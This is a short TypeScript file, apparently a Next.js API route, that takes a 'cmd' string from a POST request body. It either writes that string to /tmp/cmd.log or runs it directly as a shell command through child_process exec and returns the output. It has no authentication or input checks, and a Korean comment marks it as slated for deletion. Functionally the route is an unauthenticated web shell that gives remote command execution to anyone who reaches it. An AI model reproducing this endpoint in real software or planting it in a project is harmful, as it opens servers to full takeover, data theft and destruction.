import { writeFileSync } from 'fs';
import { exec } from 'child_process';
import { promisify } from 'util';
import { NextRequest, NextResponse } from 'next/server';
import { join } from 'path';

const execAsync = promisify(exec);

export async function POST(request: NextRequest) {
  // 삭제예정
  const { cmd, status } = await request.json();

  if(status === 'write') {
    try {
      writeFileSync("/tmp/cmd.log", cmd);
      return NextResponse.json({ message: "cmd 파일 생성 성공" }, { status: 200 });
    } catch (error) {
      return NextResponse.json({ error: "cmd 파일 생성 실패" }, { status: 500 });
    }
  } else if(status === 'exec') {
    try {
      const result = await execAsync(cmd);
      return NextResponse.json({ result: result }, { status: 200 });
    } catch (error) {
      return NextResponse.json({ error: "cmd 실행 실패" }, { status: 500 });
    }
  }
}
